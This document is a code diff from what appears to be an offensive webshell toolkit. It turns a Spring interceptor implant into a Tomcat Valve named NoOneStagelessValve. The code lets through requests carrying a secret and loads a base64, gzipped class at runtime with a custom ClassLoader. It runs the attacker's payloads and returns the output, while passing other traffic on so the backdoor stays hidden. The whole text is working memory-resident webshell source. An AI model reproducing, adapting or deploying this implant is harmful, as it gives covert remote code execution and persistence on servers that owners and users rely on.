@@ -1,58 +1,64 @@
 package com.reajason.noone.core.shelltool;
 
-import org.springframework.web.servlet.AsyncHandlerInterceptor;
-import org.springframework.web.servlet.ModelAndView;
+import org.apache.catalina.Valve;
+import org.apache.catalina.connector.Request;
+import org.apache.catalina.connector.Response;
 
+import javax.servlet.ServletException;
 import javax.servlet.ServletOutputStream;
-import javax.servlet.http.HttpServletRequest;
-import javax.servlet.http.HttpServletResponse;
-import java.io.ByteArrayInputStream;
-import java.io.ByteArrayOutputStream;
-import java.io.IOException;
+import java.io.*;
 import java.util.zip.GZIPInputStream;
 
 /**
  * @author ReaJason
- * @since 2024/12/22
+ * @since 2025/8/29
  */
-public class NoOneInterceptor extends ClassLoader implements AsyncHandlerInterceptor {
-    private static Class<?> coreClass = null;
+public class NoOneStagelessValve extends ClassLoader implements Valve {
+
+    private static volatile Class<?> coreClass = null;
     private static String coreGzipBase64;
 
-    public NoOneInterceptor() {
+    public NoOneStagelessValve() {
     }
 
-    public NoOneInterceptor(ClassLoader c) {
-        super(c);
+    public NoOneStagelessValve(ClassLoader parent) {
+        super(parent);
     }
 
     @Override
-    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
+    public void invoke(Request request, Response response) throws IOException, ServletException {
         try {
+            // stageless
             if (isAuthed(request)) {
+                ServletOutputStream responseOutputStream = response.getOutputStream();
                 try {
-                    byte[] payload = transformReqPayload(getArgFromRequest(request));
                     if (coreClass == null) {
-                        byte[] bytes = gzipDecompress(decodeBase64(coreGzipBase64));
-                        coreClass = new NoOneInterceptor(Thread.currentThread().getContextClassLoader()).defineClass(bytes, 0, bytes.length);
+                        synchronized (NoOneStagelessValve.class) {
+                            if (coreClass == null) {
+                                byte[] bytes = gzipDecompress(decodeBase64(coreGzipBase64));
+                                coreClass = new NoOneStagelessValve(Thread.currentThread().getContextClassLoader())
+                                        .defineClass(bytes, 0, bytes.length);
+                            }
+                        }
                     }
-                    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+                    byte[] payload = transformReqPayload(getArgFromRequest(request));
                     Object httpChannelCore = coreClass.newInstance();
+                    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+                    httpChannelCore.equals(new Object[]{request, response});
                     httpChannelCore.equals(new Object[]{payload, outputStream});
-                    ServletOutputStream responseOutputStream = response.getOutputStream();
                     byte[] data = wrapResData(transformResData(outputStream.toByteArray()));
                     responseOutputStream.write(data);
-                    wrapResponse(response);
-                    responseOutputStream.flush();
-                    responseOutputStream.close();
-                    return false;
-                } catch (Throwable ignored) {
+                } catch (Exception e) {
+                    responseOutputStream.write(getStackTraceAsString(e).getBytes("UTF-8"));
                 }
+                wrapResponse(response);
+                responseOutputStream.flush();
+                responseOutputStream.close();
+                return;
             }
-        } catch (Throwable e) {
-            e.printStackTrace();
+        } catch (Throwable ignored) {
         }
-        return true;
+        getNext().invoke(request, response);
     }
 
     private boolean isAuthed(Object request) {
@@ -111,18 +117,31 @@ public class NoOneInterceptor extends ClassLoader implements AsyncHandlerInterce
         }
     }
 
-    @Override
-    public void afterConcurrentHandlingStarted(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
+    private String getStackTraceAsString(Throwable throwable) {
+        StringWriter sw = new StringWriter();
+        PrintWriter pw = new PrintWriter(sw);
+        throwable.printStackTrace(pw);
+        return sw.toString();
+    }
 
+    Valve next;
+
+    @Override
+    public Valve getNext() {
+        return this.next;
     }
 
     @Override
-    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {
-
+    public void setNext(Valve valve) {
+        this.next = valve;
     }
 
     @Override
-    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
+    public boolean isAsyncSupported() {
+        return false;
+    }
 
+    @Override
+    public void backgroundProcess() {
     }
 }
